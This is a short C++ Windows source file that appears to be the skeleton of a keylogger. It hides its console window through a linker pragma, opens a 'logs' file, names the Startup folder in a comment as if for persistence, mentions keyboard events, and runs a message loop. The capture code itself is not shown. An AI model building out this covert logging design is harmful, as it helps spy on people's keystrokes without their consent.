#include <fstream>
#include "Data.hpp"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

using namespace std;

wofstream	fs("logs");

// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

//lol niteHWND win = findWindow(0, "Window"

// OutputDebugStringW(L"Got a keyboard event\n");

int main()
{
	Data data;
	MSG msg;

	while (GetMessage(&msg, NULL, NULL, NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}